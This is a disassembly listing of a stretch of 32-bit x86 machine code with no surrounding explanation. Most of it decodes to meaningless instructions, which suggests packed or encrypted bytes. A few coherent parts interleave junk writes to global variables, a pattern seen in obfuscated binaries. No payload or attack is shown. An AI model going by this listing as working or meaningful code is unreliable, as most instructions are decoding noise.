  408a00:	outs   dx,BYTE PTR ds:[esi]
  408a01:	sbb    al,0x13
  408a03:	div    DWORD PTR [edi+0x6b]
  408a06:	pop    es
  408a07:	xchg   esp,eax
  408a08:	or     eax,0x2bcec596
  408a0d:	cmp    ebx,DWORD PTR [ebx+ebx*2]
  408a10:	sub    eax,DWORD PTR [edx+0x5a]
  408a13:	mov    bh,BYTE PTR ds:0xf298ff4a
  408a19:	aad    0x29
  408a1b:	popa   
  408a1c:	out    dx,eax
  408a1d:	rcl    dl,0x4
  408a20:	xor    DWORD PTR [esi],0xffffffcc
  408a23:	jmp    0x7f16:0xa96a2d9
  408a2a:	mov    esp,0xba3fb1a8
  408a2f:	cld    
  408a30:	dec    esi
  408a31:	mov    bh,0x4d
  408a33:	stc    
  408a34:	sbb    ebx,DWORD PTR [edx-0x54]
  408a37:	popf   
  408a38:	xchg   esi,eax
  408a39:	xchg   esi,eax
  408a3a:	call   0x8f9a:0x750b2b07
  408a41:	call   DWORD PTR [ebx+0x403c705e]
  408a47:	add    BYTE PTR ds:0xaefd6ecc,bl
  408a4d:	cmp    DWORD PTR [edx-0x42],esi
  408a50:	xor    bl,bl
  408a52:	dec    ebp
  408a53:	jno    0x408ab8
  408a55:	sbb    edi,DWORD PTR [ebx-0x63]
  408a58:	int3   
  408a59:	push   esp
  408a5a:	scas   eax,DWORD PTR es:[edi]
  408a5b:	test   al,0xbd
  408a5d:	pop    edi
  408a5e:	stc    
  408a5f:	mov    ds:0xe5ba49db,al
  408a64:	add    DWORD PTR [edx],esp
  408a66:	push   ds
  408a67:	pusha  
  408a68:	in     al,dx
  408a69:	mov    fs,WORD PTR [ebx+edx*8-0x49517915]
  408a70:	adc    eax,0xbceba663
  408a75:	hlt    
  408a76:	inc    ecx
  408a77:	or     ebp,DWORD PTR [esi+0x18]
  408a7a:	cwde   
  408a7b:	add    eax,0x8c6a3c45
  408a80:	lock out 0x47,eax
  408a83:	ret    
  408a84:	adc    DWORD PTR [ebp+0x15],edx
  408a87:	xor    BYTE PTR [ecx],ah
  408a89:	das    
  408a8a:	inc    ecx
  408a8b:	mov    cl,0x63
  408a8d:	retf   0xbe7c
  408a90:	cmp    edx,DWORD PTR [esi]
  408a92:	sbb    BYTE PTR [ecx],ch
  408a94:	sub    eax,0xb5b09ba5
  408a99:	sbb    eax,0x86005819
  408a9e:	add    ecx,DWORD PTR [ecx-0x333ba2d0]
  408aa4:	or     BYTE PTR [ebp-0x27],cl
  408aa7:	adc    BYTE PTR [ecx],dh
  408aa9:	repnz into 
  408aab:	dec    esi
  408aac:	cdq    
  408aad:	cmp    DWORD PTR gs:[ecx-0x2e1761a5],esp
  408ab4:	sahf   
  408ab5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ab6:	sti    
  408ab7:	dec    esi
  408ab8:	sbb    ebx,DWORD PTR [ebx-0x57d5c4bf]
  408abe:	sbb    eax,0x168bc295
  408ac3:	retf   0xdb83
  408ac6:	hlt    
  408ac7:	imul   esi,esi,0x17
  408aca:	shl    DWORD PTR [ebp+0x4af329ed],0x4d
  408ad1:	mov    ?,WORD PTR [esi]
  408ad3:	mov    ds:0x41e3bbcb,al
  408ad8:	xchg   ebx,eax
  408ad9:	sbb    al,ch
  408adb:	jne    0x408abb
  408add:	mov    bh,0xf
  408adf:	(bad)  
  408ae1:	rol    BYTE PTR [ecx+edi*1-0x5ea0cc50],1
  408ae8:	jmp    FWORD PTR [esi+0x2d4f7f3d]
  408aee:	sbb    al,0xde
  408af0:	adc    eax,0x9fcf9c27
  408af5:	mov    ebx,0xdf8b5f64
  408afa:	xor    al,0xdc
  408afc:	mov    ch,0xef
  408afe:	mov    dh,0x91
  408b00:	xchg   ebp,eax
  408b01:	sub    eax,0xd78bfb52
  408b06:	sahf   
  408b07:	adc    eax,0xfd3fcde5
  408b0c:	in     al,0xf4
  408b0e:	mov    WORD PTR [ecx-0x36],es
  408b11:	push   ss
  408b12:	repnz nop
  408b14:	push   cs
  408b15:	call   0xffdc:0xdb866b13
  408b1c:	jmp    0x408b80
  408b1e:	inc    esp
  408b1f:	lock or al,0xa2
  408b23:	pop    edi
  408b24:	pop    ds
  408b25:	add    al,0x54
  408b27:	jno    0x408b51
  408b29:	push   cs
  408b2a:	(bad)  
  408b2b:	sahf   
  408b2c:	jbe    0x408b63
  408b2e:	inc    edi
  408b2f:	mov    WORD PTR [ecx+0x55],ds
  408b32:	xchg   ebx,eax
  408b33:	(bad)  
  408b34:	mov    esi,0xe7e7965c
  408b39:	inc    edx
  408b3a:	rol    DWORD PTR [eax-0x289b9d19],0xc2
  408b41:	or     eax,0xf247f13c
  408b46:	mov    esp,0x40d10421
  408b4b:	xor    BYTE PTR [edi-0x40e91d34],cl
  408b51:	mov    edx,0x75cdd720
  408b56:	add    DWORD PTR [ecx+0x48fd9de0],ecx
  408b5c:	sbb    al,0x99
  408b5e:	mov    bl,0x3c
  408b60:	sbb    al,0x41
  408b62:	lock aam 0xe1
  408b65:	adc    BYTE PTR [esi+ecx*1-0x80],ah
  408b69:	pop    ds
  408b6a:	xchg   ebp,eax
  408b6b:	test   al,0x9c
  408b6d:	pop    eax
  408b6e:	sub    BYTE PTR [esi],bh
  408b70:	jb     0x408b1c
  408b72:	adc    al,0x2b
  408b74:	and    DWORD PTR [edi],edi
  408b76:	cmp    cl,BYTE PTR [edi]
  408b78:	jg     0x408bb5
  408b7a:	loopne 0x408bee
  408b7c:	xor    eax,0x61819626
  408b81:	xor    ebp,DWORD PTR [esi-0x5b]
  408b84:	sub    al,0xb4
  408b86:	test   al,0x3a
  408b88:	push   0xffffff99
  408b8a:	imul   esp,DWORD PTR [edi],0x11
  408b8d:	cmp    eax,0x5600a1a9
  408b92:	xchg   esp,eax
  408b93:	(bad)  
  408b94:	fwait
  408b95:	jnp    0x408b2e
  408b97:	imul   ebp,DWORD PTR [esi-0x29211f52],0xbf79cc8a
  408ba1:	mov    bh,0x66
  408ba3:	or     al,ch
  408ba5:	ins    DWORD PTR es:[edi],dx
  408ba6:	arpl   bp,sp
  408ba8:	popa   
  408ba9:	test   BYTE PTR [edx-0x1a],ah
  408bac:	into   
  408bad:	jbe    0x408ba2
  408baf:	sub    BYTE PTR [ecx-0x6b],dh
  408bb2:	sbb    BYTE PTR [edx-0x6c],ah
  408bb5:	loop   0x408b5b
  408bb7:	and    DWORD PTR ds:0x704b2cac,ebp
  408bbd:	xlat   BYTE PTR ds:[ebx]
  408bbe:	outs   dx,BYTE PTR ds:[esi]
  408bbf:	mov    ch,BYTE PTR [esi+esi*8]
  408bc2:	gs popf 
  408bc4:	adc    bh,bl
  408bc6:	pop    esi
  408bc7:	mov    esi,0xcd20918a
  408bcc:	pop    ds
  408bcd:	inc    esi
  408bce:	dec    ebx
  408bcf:	int3   
  408bd0:	into   
  408bd1:	popa   
  408bd2:	js     0x408c2b
  408bd4:	js     0x408b98
  408bd6:	add    bl,BYTE PTR [eax+0x5]
  408bd9:	shr    DWORD PTR [esi],0x76
  408bdc:	shl    DWORD PTR [ebp+0xa10c039],0xf4
  408be3:	inc    eax
  408be4:	sub    ebp,DWORD PTR ds:0xc78f235
  408bea:	mov    BYTE PTR [esi-0xe81ace7],bh
  408bf0:	mov    BYTE PTR [ebp+0x7579ea2b],0xea
  408bf7:	mov    cl,0x1e
  408bf9:	push   ds
  408bfa:	jle    0x408c68
  408bfc:	sub    al,0x3
  408bfe:	inc    esi
  408bff:	xor    eax,0xf6780cd5
  408c04:	jecxz  0x408bc2
  408c06:	test   DWORD PTR [edx],edx
  408c08:	mov    dl,0x4c
  408c0a:	dec    eax
  408c0b:	outs   dx,BYTE PTR ds:[esi]
  408c0c:	add    bl,BYTE PTR [eax-0x11c84402]
  408c12:	lock push ss
  408c14:	jb     0x408c12
  408c16:	add    al,0xc8
  408c18:	sti    
  408c19:	jmp    0x408c3c
  408c1b:	inc    eax
  408c1c:	push   es
  408c1d:	inc    ecx
  408c1e:	pop    ds
  408c1f:	push   esp
  408c20:	and    bh,BYTE PTR [esi+ebx*4+0x52f29d60]
  408c27:	xor    ebx,DWORD PTR [edi+0x35c12d14]
  408c2d:	fidiv  DWORD PTR [edx+0xc]
  408c30:	xchg   ebp,eax
  408c31:	test   BYTE PTR [ebp-0x7],al
  408c34:	mov    dh,ah
  408c36:	dec    esp
  408c37:	popf   
  408c38:	jl     0x408c14
  408c3a:	inc    ecx
  408c3b:	mov    DWORD PTR [edi+0x4ee644ec],edx
  408c41:	mov    ah,0x5c
  408c43:	pop    eax
  408c44:	shl    DWORD PTR [ecx],1
  408c46:	xchg   ecx,eax
  408c47:	cmp    eax,0xd142820a
  408c4c:	jno    0x408c67
  408c4e:	neg    DWORD PTR [ecx+ebp*2+0xf]
  408c52:	test   DWORD PTR [ecx+0x0],eax
  408c55:	add    BYTE PTR [eax],al
  408c57:	mov    eax,ds:0x41497e
  408c5c:	mov    eax,DWORD PTR [eax]
  408c5e:	mov    DWORD PTR ds:0x4346c3,0x3b52
  408c68:	mov    DWORD PTR [ebp-0x14],eax
  408c6b:	mov    eax,ds:0x414b86
  408c70:	mov    DWORD PTR ds:0x434687,0x120a
  408c7a:	mov    eax,DWORD PTR [eax]
  408c7c:	mov    DWORD PTR ds:0x4346b7,0x2b06
  408c86:	mov    DWORD PTR [ebp-0x18],eax
  408c89:	mov    DWORD PTR ds:0x4345ef,0x61a0
  408c93:	jmp    0x4092c1
  408c98:	mov    DWORD PTR ds:0x4346ff,0x680c
  408ca2:	cmp    edi,0x33c
  408ca8:	mov    DWORD PTR ds:0x434677,0x197
  408cb2:	jne    0x408fac
  408cb8:	jmp    0x408f40
  408cbd:	call   0x641af49f
  408cc2:	je     0x408d41
  408cc4:	fnsave [eax-0x52]
  408cc7:	inc    ecx
  408cc8:	leave  
  408cc9:	sar    DWORD PTR [ebp+esi*8+0x2d],0x44
  408cce:	in     eax,0x7e
  408cd0:	jle    0x408cb3
  408cd2:	js     0x408d52
  408cd4:	jle    0x408cfa
  408cd6:	sub    BYTE PTR ds:0x2f309215,dh
  408cdc:	pop    edx
  408cdd:	out    0xe7,eax
  408cdf:	sti    
  408ce0:	jno    0x408d47
  408ce2:	dec    ebx
  408ce3:	mov    dl,0x13
  408ce5:	loopne 0x408d54
  408ce7:	jp     0x408cef
  408ce9:	in     al,dx
  408cea:	jb     0x408cb4
  408cec:	ins    BYTE PTR es:[edi],dx
  408ced:	add    bh,ah
  408cef:	inc    ebp
  408cf0:	dec    esp
  408cf1:	enter  0x9392,0x6
  408cf5:	jmp    0x67e06af6
  408cfa:	pop    ds
  408cfb:	cdq    
  408cfc:	jb     0x408d7d
  408cfe:	pop    esi
  408cff:	jbe    0x408d5c
  408d01:	arpl   WORD PTR [edi],bp
  408d03:	adc    dh,al
  408d05:	adc    DWORD PTR [esi+0x2d2fd5dc],ecx
  408d0b:	xchg   DWORD PTR [edx+eiz*1],esi
  408d0e:	jle    0x408cb3
  408d10:	dec    ebp
  408d11:	pop    ebx
  408d12:	out    dx,al
  408d13:	mov    dl,0x13
  408d15:	scas   eax,DWORD PTR es:[edi]
  408d16:	jo     0x408d13
  408d18:	fstp   QWORD PTR [edi-0x4d]
  408d1b:	push   ss
  408d1c:	mov    ah,0xf9
  408d1e:	sar    al,0x24
  408d21:	jle    0x408ccc
  408d23:	arpl   WORD PTR [ebp-0x7d],dx
  408d26:	jle    0x408d48
  408d28:	inc    edx
  408d29:	sbb    al,0x75
  408d2b:	pushf  
  408d2c:	mov    dh,0x52
  408d2e:	adc    ecx,DWORD PTR [ecx-0x139954ee]
  408d34:	aaa    
  408d35:	mov    edx,0x704c1709
  408d3a:	jle    0x408daa
  408d3c:	(bad)  
  408d3d:	in     al,dx
  408d3e:	and    DWORD PTR [esp+ebp*2],ebp
  408d41:	popf   
  408d42:	imul   ebx,esi,0x6d
  408d45:	inc    esp
  408d46:	(bad)  
  408d47:	sbb    ebp,DWORD PTR [eax+0x3df38105]
  408d4d:	dec    esi
  408d4e:	mov    dh,0x71
  408d50:	call   0x4e27:0xfa1c7876
  408d57:	dec    edx
  408d58:	jmp    0xf180:0xb176ccda
  408d5f:	jge    0x408dc6
  408d61:	sbb    DWORD PTR [eax+0x109f203e],0xffffffc7
  408d68:	inc    ebx
  408d69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d6a:	jecxz  0x408d95
  408d6c:	pop    esi
  408d6d:	mov    eax,0xb3803fc3
  408d72:	daa    
  408d73:	mov    edi,0x3b49ea06
  408d78:	pop    eax
  408d79:	pop    ecx
  408d7a:	aas    
  408d7b:	in     eax,0x2c
  408d7d:	jl     0x408dbf
  408d7f:	and    BYTE PTR [esi-0x2f96aa6e],dh
  408d85:	dec    edi
  408d86:	arpl   WORD PTR [edx-0x68d8880d],dx
  408d8c:	dec    edx
  408d8d:	ret    0xf2bc
  408d90:	mov    BYTE PTR ds:0x274ced85,bl
  408d96:	das    
  408d97:	lock cdq 
  408d99:	sbb    eax,ecx
  408d9b:	xor    eax,0xbf2ecdf6
  408da0:	sahf   
  408da1:	shl    al,0x42
  408da4:	xor    eax,DWORD PTR [edx+eiz*8-0x1f]
  408da8:	daa    
  408da9:	retf   
  408daa:	inc    ebp
  408dab:	push   0xffffffd2
  408dad:	test   ebp,ebp
  408daf:	repz or eax,0x9fbb92f1
  408db5:	outs   dx,BYTE PTR ds:[esi]
  408db6:	inc    DWORD PTR [ecx+0x14]
  408db9:	push   ss
  408dba:	outs   dx,DWORD PTR ds:[esi]
  408dbb:	not    BYTE PTR [edx+0x56]
  408dbe:	and    BYTE PTR [ebx],bl
  408dc0:	popf   
  408dc1:	js     0x408e35
  408dc3:	cs pop edx
  408dc5:	push   edx
  408dc6:	test   eax,0xe2292457
  408dcb:	nop
  408dcc:	addr16 push eax
  408dce:	dec    edi
  408dcf:	mov    dl,0x15
  408dd1:	sub    DWORD PTR [ecx],ebx
  408dd3:	xchg   edi,eax
  408dd4:	scas   al,BYTE PTR es:[edi]
  408dd5:	inc    ecx
  408dd6:	arpl   WORD PTR [esi+edi*2+0x20],cx
  408dda:	imul   ecx,DWORD PTR [ecx-0x26c7e0b6],0x21
  408de1:	in     al,dx
  408de2:	or     ah,BYTE PTR [ecx-0xe]
  408de5:	mov    cl,0xf5
  408de7:	cli    
  408de8:	imul   ebx,eax,0xf32b55a8
  408dee:	jo     0x408db3
  408df0:	sbb    DWORD PTR [edi],0x42374a79
  408df6:	leave  
  408df7:	jno    0x408de3
  408df9:	jne    0x408dd5
  408dfb:	jp     0x408d86
  408dfd:	and    eax,0xd9b236c
  408e02:	pop    ecx
  408e03:	stos   DWORD PTR es:[edi],eax
  408e04:	jnp    0x408e35
  408e06:	ja     0x408dbf
  408e08:	mov    eax,0xaa7addd7
  408e0d:	mov    eax,0xcda93f82
  408e12:	adc    ch,dl
  408e14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e15:	add    eax,0x161f1a7f
  408e1a:	out    0x76,al
  408e1c:	lods   eax,DWORD PTR ds:[esi]
  408e1d:	ret    
  408e1e:	aad    0xfc
  408e20:	mov    bl,0xdd
  408e22:	fsub   DWORD PTR [edi-0x6b]
  408e25:	adc    al,0x86
  408e27:	ins    BYTE PTR es:[edi],dx
  408e28:	push   cs
  408e29:	call   0xef83:0x60542a73
  408e30:	pop    esp
  408e31:	sbb    BYTE PTR [esi-0x723b1744],dh
  408e37:	(bad)  
  408e38:	in     al,0xcc
  408e3a:	loop   0x408e67
  408e3c:	leave  
  408e3d:	or     DWORD PTR [esi],ebp
  408e3f:	mov    eax,0x80e2e38a
  408e44:	push   0xffffffc0
  408e46:	mov    ds:0xa8de1a4e,eax
  408e4b:	out    dx,eax
  408e4c:	dec    edx
  408e4d:	outs   dx,DWORD PTR ds:[esi]
  408e4e:	outs   dx,DWORD PTR ds:[esi]
  408e4f:	call   0x4388:0xee74a3e3
  408e56:	jnp    0x408e4e
  408e58:	stos   DWORD PTR es:[edi],eax
  408e59:	call   esp
  408e5b:	call   0x5a78ecc
  408e60:	addr16 fwait
  408e62:	cmp    al,0x9c
  408e64:	jo     0x408e9f
  408e66:	rcr    DWORD PTR [eax+ebx*1],1
  408e69:	or     DWORD PTR [esi+0x1b301658],ebp
  408e6f:	nop
  408e70:	or     al,0xc4
  408e72:	sub    BYTE PTR [bp+si-0x5b73],al
  408e77:	jp     0x408e64
  408e79:	xor    dl,BYTE PTR [edi+0x2597c463]
  408e7f:	(bad)  
  408e80:	sub    eax,DWORD PTR [ecx-0x1edd158f]
  408e86:	es add ch,dl
  408e89:	jne    0x408e8f
  408e8b:	and    bh,BYTE PTR [edx-0x77]
  408e8e:	(bad)  
  408e8f:	mov    eax,0xc58a5a5a
  408e94:	sbb    cl,BYTE PTR [ebp+0x48]
  408e97:	inc    ebp
  408e98:	mov    al,0x32
  408e9a:	jno    0x408e95
  408e9c:	rol    bh,1
  408e9e:	jge    0x408efa
  408ea0:	xor    ah,BYTE PTR [edx]
  408ea2:	xor    ebp,DWORD PTR [edx]
  408ea4:	pushf  
  408ea5:	sahf   
  408ea6:	out    dx,eax
  408ea7:	in     eax,0x39
  408ea9:	jmp    0x8a58:0x5bce205b
  408eb0:	pop    eax
  408eb1:	push   esi
  408eb2:	jl     0x408ea4
  408eb4:	mov    ebp,0xe4b387df
  408eb9:	(bad)  
  408ebc:	mov    al,ds:0x78d8ef4f
  408ec1:	(bad)  
  408ec3:	jbe    0x408e63
  408ec5:	dec    ecx
  408ec6:	mov    ch,0x58
  408ec8:	ror    edi,1
  408eca:	fs stos DWORD PTR es:[edi],eax
  408ecc:	or     cl,ch
  408ece:	or     edx,DWORD PTR [edi+eax*8]
  408ed1:	push   esi
  408ed2:	imul   ebp,edx,0xef8f0f1a
  408ed8:	mov    bl,0x2c
  408eda:	ror    DWORD PTR [esp+edi*2+0x7c9c22e8],0xbc
  408ee2:	inc    edi
  408ee3:	test   al,0x17
  408ee5:	int    0x82
  408ee7:	pop    esp
  408ee8:	jecxz  0x408f48
  408eea:	neg    BYTE PTR [ebp+0x6ae953f3]
  408ef0:	xchg   edx,eax
  408ef1:	out    0x3e,al
  408ef3:	je     0x408e9a
  408ef5:	lods   eax,DWORD PTR ds:[esi]
  408ef6:	loopne 0x408e86
  408ef8:	pop    ebx
  408ef9:	neg    BYTE PTR [esp+ecx*8+0xbdda87a]
  408f00:	add    eax,0xc62b49e0
  408f05:	scas   eax,DWORD PTR es:[edi]
  408f06:	je     0x408f13
  408f08:	sti    
  408f09:	fs jmp 0x50895f9f
  408f0f:	mov    eax,ds:0xa17b11f5
  408f14:	inc    ebp
  408f15:	lahf   
  408f16:	fsub   QWORD PTR [esp+ebx*8-0x7e]
  408f1a:	(bad)  
  408f1b:	push   ebx
  408f1c:	inc    esp
  408f1d:	mov    cl,BYTE PTR [ecx]
  408f1f:	dec    eax
  408f20:	fld    QWORD PTR [esi]
  408f22:	loopne 0x408f4c
  408f24:	cli    
  408f25:	aad    0xe0
  408f27:	or     DWORD PTR [edx],eax
  408f29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f2a:	mov    ecx,0x75186553
  408f2f:	sub    ecx,DWORD PTR [edx+0x6ab485a6]
  408f35:	mov    esp,0xa7a0f497
  408f3a:	clc    
  408f3b:	mov    bl,0xee
  408f3d:	mov    esp,ss
  408f3f:	pop    ecx
  408f40:	and    DWORD PTR [ebp+0x8],0x0
  408f44:	mov    eax,DWORD PTR [ebp-0x8]
  408f47:	or     DWORD PTR ds:0x4346c3,0x434683
  408f51:	sub    eax,DWORD PTR [ebp+0x8]
  408f54:	push   eax
  408f55:	mov    eax,ds:0x434703
  408f5a:	or     DWORD PTR ds:0x4346c3,eax
  408f60:	mov    eax,DWORD PTR [ebp-0x4]
  408f63:	add    DWORD PTR ds:0x4345df,0x43464f
  408f6d:	add    eax,DWORD PTR [ebp+0x8]
  408f70:	sub    DWORD PTR ds:0x4346c7,0x434647
  408f7a:	push   eax
  408f7b:	dec    DWORD PTR ds:0x4345eb
  408f81:	call   0x4092e7
  408f86:	mov    DWORD PTR ds:0x4346b7,0x29a7
  408f90:	inc    DWORD PTR [ebp+0x8]
  408f93:	cmp    DWORD PTR [ebp+0x8],0x52
  408f97:	mov    DWORD PTR ds:0x4345ff,0x7d48
  408fa1:	jb     0x408f44
  408fa7:	jmp    0x4092c1
  408fac:	cmp    edi,0x1a2
  408fb2:	jne    0x40928f
  408fb8:	mov    DWORD PTR [ebp-0x60],0xf89c853a
  408fbf:	mov    eax,DWORD PTR [ebp-0x4]
  408fc2:	mov    DWORD PTR [ebp-0x5c],eax
  408fc5:	mov    eax,DWORD PTR [ebp-0x8]
  408fc8:	mov    DWORD PTR [ebp-0x58],eax
  408fcb:	mov    eax,DWORD PTR [ebp-0xc]
  408fce:	jmp    0x409256
  408fd3:	mov    BYTE PTR [edi],al
  408fd5:	xchg   esi,eax
  408fd6:	jno    0x408f69
  408fd8:	jno    0x409043
  408fda:	out    0xcb,eax
  408fdc:	fisttp DWORD PTR [esi+esi*1+0x7793a776]
  408fe3:	das    
  408fe4:	loopne 0x409064
  408fe6:	jle    0x408fc9
  408fe8:	js     0x409068
  408fea:	jle    0x408fa4
  408fec:	mov    esp,0x751b9794
  408ff1:	fwait
  408ff2:	out    dx,al
  408ff3:	lods   eax,DWORD PTR ds:[esi]
  408ff4:	xchg   esi,eax
  408ff5:	lock iret 
  408ff7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ff8:	icebp  
  408ff9:	lods   al,BYTE PTR ds:[esi]
  408ffa:	icebp  
  408ffb:	js     0x40907b
  408ffd:	leave  
  408ffe:	iret   
  408fff:	add    eax,0x13049d0f
  409004:	xchg   DWORD PTR [edi-0x2873efd8],esi
  40900a:	rcl    DWORD PTR [ecx-0x46],cl
  40900d:	(bad)  
  40900e:	mov    edx,0x5e8ba4e0
  409013:	icebp  
  409014:	or     eax,0xa38c96b
  409019:	out    dx,eax
  40901a:	je     0x408fe2
  40901c:	inc    ebx
  40901d:	pusha  
  40901e:	sub    DWORD PTR [edx],esi
  409020:	scas   al,BYTE PTR es:[edi]
  409021:	ja     0x408fca
  409023:	push   cs
  409024:	and    bh,ah
  409026:	push   edi
  409027:	dec    ebx
  409028:	shr    dl,0xd8
  40902b:	(bad)  
  40902c:	push   ecx
  40902d:	dec    edx
  40902e:	sub    BYTE PTR [eax],ch
  409030:	int    0x6c
  409032:	fisttp WORD PTR [edx+0x57]
  409035:	in     eax,dx
  409036:	xchg   ebx,eax
  409037:	jmp    0xc20e:0xd8965cf9
  40903e:	and    ebp,ebx
  409040:	add    eax,0xebcae27
  409045:	out    dx,al
  409046:	mov    ch,0xf6
  409048:	fs pusha 
  40904a:	adc    al,0x2d
  40904c:	inc    edi
  40904d:	jl     0x409026
  40904f:	repnz dec bp
  409052:	dec    ebx
  409053:	adc    eax,0x87d7634b
  409058:	int    0x5e
  40905a:	xor    DWORD PTR [eax-0x6dca819],esi
  409060:	cmp    BYTE PTR [eax+0x4b7e88f5],cl
  409066:	cs clc 
  409068:	js     0x409007
  40906a:	ja     0x4090cc
  40906c:	sub    DWORD PTR [ecx],ebp
  40906e:	leave  
  40906f:	aam    0x43
  409071:	mov    bh,0x39
  409073:	dec    ebx
  409074:	and    al,0x8a
  409076:	sbb    al,0x4d
  409078:	cmp    BYTE PTR [ebx+ebx*4-0x5b],dh
  40907c:	and    DWORD PTR [edi],esi
  40907e:	xor    ch,BYTE PTR [edx]
  409080:	mov    eax,ds:0x80777b3a
  409085:	out    dx,eax
  409086:	leave  
  409087:	dec    esp
  409088:	mov    dl,0x91
  40908a:	ror    DWORD PTR [eax-0x6e],1
  40908d:	mov    al,ds:0xf4f22bcc
  409092:	jge    0x4090c2
  409094:	add    ecx,edi
  409096:	adc    eax,0x432d70d9
  40909b:	stos   DWORD PTR es:[edi],eax
  40909c:	push   ss
  40909d:	sbb    dl,al
  40909f:	inc    edi
  4090a0:	mov    bh,0x35
  4090a2:	test   DWORD PTR [edx-0x5b369727],ebp
  4090a8:	jnp    0x4090bd
  4090aa:	dec    ebx
  4090ab:	sub    BYTE PTR [ecx+0x66],cl
  4090ae:	imul   esi,DWORD PTR [ebx+0x5f367a63],0x894f82a1
  4090b8:	ret    
  4090b9:	sub    BYTE PTR [eax-0x579965ad],bl
  4090bf:	jb     0x4090f6
  4090c1:	jle    0x40913d
  4090c3:	not    BYTE PTR [ebp-0x497648f6]
  4090c9:	jmp    0xd9c2db56
  4090ce:	scas   eax,DWORD PTR es:[edi]
  4090cf:	stos   DWORD PTR es:[edi],eax
  4090d0:	mov    al,ds:0xfad7799c
  4090d5:	js     0x409101
  4090d7:	fld    QWORD PTR [edi-0x6f]
  4090da:	mov    edi,0x3192b05
  4090df:	mov    al,0x2b
  4090e1:	mov    WORD PTR [edx-0x6fb8ff6e],ss
  4090e7:	and    dl,BYTE PTR [esi-0x4bed9d38]
  4090ed:	std    
  4090ee:	mov    ebx,0x5db41866
  4090f3:	push   edi
  4090f4:	or     al,0x91
  4090f6:	nop
  4090f7:	mov    edx,0xa77a4d99
  4090fc:	adc    al,0xf3
  4090fe:	add    eax,0xd2c97879
  409103:	sbb    BYTE PTR [edx+0x3c],al
  409106:	xchg   esp,eax
  409107:	bound  esi,QWORD PTR [esp+eax*2]
  40910a:	adc    eax,eax
  40910c:	das    
  40910d:	in     eax,0x1f
  40910f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409110:	pop    ebp
  409111:	jge    0x4090af
  409113:	cmp    esp,DWORD PTR [ebx]
  409115:	push   edx
  409116:	ja     0x4090a6
  409118:	outs   dx,BYTE PTR ds:[esi]
  409119:	pop    esi
  40911a:	xchg   edx,eax
  40911b:	mov    edi,db7
  40911e:	les    esp,FWORD PTR [esi+0x3bf01bf1]
  409124:	sbb    al,0x4a
  409126:	push   ds
  409127:	adc    eax,eax
  409129:	or     ah,dl
  40912b:	jle    0x40913a
  40912d:	retf   
  40912e:	enter  0xffbc,0x61
  409132:	outs   dx,DWORD PTR ds:[esi]
  409133:	repz jmp 0x88e2:0xaf3a8bf4
  40913b:	adc    dl,0xe9
  40913e:	push   ecx
  40913f:	fsubr  QWORD PTR [ecx+0x164a202b]
  409145:	xchg   edi,eax
  409146:	mov    ah,0x8e
  409148:	fwait
  409149:	call   0x6dd8a09b
  40914e:	and    eax,0x357ee895
  409153:	and    al,BYTE PTR [edi+0xda7aa71]
  409159:	xchg   edi,eax
  40915a:	jecxz  0x409122
  40915c:	(bad)  
  40915d:	out    dx,al
  40915e:	into   
  40915f:	sub    bh,BYTE PTR [esi-0x5b6911df]
  409165:	adc    dh,dh
  409167:	dec    esi
  409168:	xchg   esp,eax
  409169:	cmp    al,0xe2
  40916b:	sub    eax,0xb9280a4f
  409170:	push   ecx
  409171:	xor    al,0xb0
  409173:	out    0x99,al
  409175:	ret    0x672f
  409178:	xor    ebp,DWORD PTR [bp+di+0x2d33]
  40917d:	out    0xcb,eax
  40917f:	jmp    0xb922:0xfde84f9c
  409186:	imul   ecx,DWORD PTR [eax-0x75982f89],0xaf28f7e6
  409190:	adc    edx,DWORD PTR fs:[esi+eax*2]
  409194:	shl    BYTE PTR [ebx-0x7df81b],cl
  40919a:	mov    esi,0xb3c6e82d
  40919f:	adc    DWORD PTR [esi],edi
  4091a1:	xor    edx,edx
  4091a3:	pop    ds
  4091a4:	fadd   DWORD PTR [esp+eax*2+0x52]
  4091a8:	inc    edi
  4091a9:	clc    
  4091aa:	rcl    DWORD PTR [ebx],1
  4091ac:	lods   al,BYTE PTR ds:[esi]
  4091ad:	jnp    0x4091f4
  4091af:	mov    eax,ds:0x92161c69
  4091b4:	cmp    al,BYTE PTR [ecx+0x75e080f]
  4091ba:	cmp    BYTE PTR [esi],dl
  4091bc:	lock aam 0x53
  4091bf:	push   0x745b80de
  4091c4:	cli    
  4091c5:	mov    ds:0x31627c9b,al
  4091ca:	cmc    
  4091cb:	repnz sbb ah,BYTE PTR [ecx]
  4091ce:	add    al,0xe0
  4091d0:	sbb    edi,esp
  4091d2:	inc    esp
  4091d3:	sbb    al,0x2e
  4091d5:	pop    esp
  4091d6:	in     eax,dx
  4091d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091d8:	mov    edi,0xacc42e66
  4091dd:	push   ebp
  4091de:	push   eax
  4091df:	scas   al,BYTE PTR es:[edi]
  4091e0:	xor    DWORD PTR [ebp+0x56a06ca5],eax
  4091e6:	cwde   
  4091e7:	inc    esp
  4091e8:	jl     0x4091f6
  4091ea:	rcl    BYTE PTR [esi-0x47de47b8],1
  4091f0:	xchg   BYTE PTR [edx-0x46],cl
  4091f3:	dec    ebp
  4091f4:	fisubr DWORD PTR ds:0x33e95522
  4091fa:	popa   
  4091fb:	das    
  4091fc:	imul   ebp,DWORD PTR [ecx+0xe9d3ad7],0xffffffff
  409203:	push   ecx
  409204:	fs adc eax,0xec8efae6
  40920a:	sti    
  40920b:	cdq    
  40920c:	inc    ebx
  40920d:	(bad)  [ecx-0x20]
  409210:	mov    bl,0xaf
  409212:	jg     0x409226
  409214:	sbb    edx,DWORD PTR [ebx+0x66]
  409217:	cmp    eax,DWORD PTR [eax-0x2e]
  40921a:	pop    esp
  40921b:	push   ebx
  40921c:	cmp    al,0x19
  40921e:	jecxz  0x40929f
  409220:	fistp  QWORD PTR [esi+edx*2+0x18c42956]
  409227:	out    dx,eax
  409228:	enter  0x7b36,0x6
  40922c:	mov    ah,0x0
  40922e:	adc    al,0x3
  409230:	dec    edx
  409231:	adc    eax,0x9a4a7a2f
  409236:	cmp    BYTE PTR [eax],bh
  409238:	in     eax,0x19
  40923a:	and    al,bl
